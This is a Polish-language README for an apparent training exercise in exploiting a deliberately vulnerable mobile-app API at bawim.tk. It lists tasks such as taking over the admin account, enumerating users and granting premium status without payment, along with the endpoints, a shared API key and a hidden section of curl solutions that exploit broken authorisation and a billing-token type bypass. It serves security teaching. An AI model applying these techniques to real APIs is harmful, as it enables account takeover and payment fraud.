# bawim
## Analiza oraz wykorzystanie podatności w zapytaniach HTTP pomiędzy aplikacją mobilną i API
Instalacja nie jest wymagana, API znajduje się pod adresem https://bawim.tk.  
Do wysyłania zapytań najlepiej użyć narzędzia curl lub serwisu https://postman.co.

## Zadania
[przykładowe] 0. Znajdź wersję aplikacji.  
curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/get_app_version

1. Znajdź ID konta 'admin', a następnie klucz przypisany do konta.
2. Przy użyciu znalezionego klucza wypisz szczegółowe informacje o koncie 'admin'.
3. Zresetuj hasło admina, znając kod funkcji weryfikującej token.  
![alt text](https://github.com/matih123/bawim/blob/master/verify.png)  
4. Zaloguj się na konto admina (podaj id sesji).  
5. Znajdź użytkownika, który ma na koncie $1.000.000.  
podpowiedź: napisz prosty skrypt np. w pythonie (moduł requests).  
![alt text](https://github.com/matih123/bawim/blob/master/requests.png)  
6. Ustaw typ konta na premium dowolnemu użytkownikowi.  
podpowiedź: https://youtu.be/MpeaSNERwQA.

## Lista endpointów API

Wszystkie endpointy działają w oparciu o metodę POST oraz wymagają uwierzytelnienia kluczem globalnym (-d key=Re2LPGUMEKa34ik1uhHOBMoc). 

* https://bawim.tk/get_app_version  
parametry: key   
* https://bawim.tk/user/{user_id}  
parametry: key  
* https://bawim.tk/user_data/{user_id}  
parametry: key, user_key  
* https://bawim.tk/login/{username}  
parametry: key, password  
* https://bawim.tk/reset_password/{user_id}  
parametry: key  
* https://bawim.tk/set_password/{user_id}/{token}  
parametry: key, new_password  
* https://bawim.tk/set_premium_account/{user_id}  
parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w formacie json (-d json={json_string})  

## Rozwiązania
<details>
  <summary>Pokaż</summary>
  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/login/admin  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/user/386  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d user_key=AnbgzkuaayRdT4HIab8lV513 https://bawim.tk/user_data/386  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/reset_password/386  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200  
  
</details>
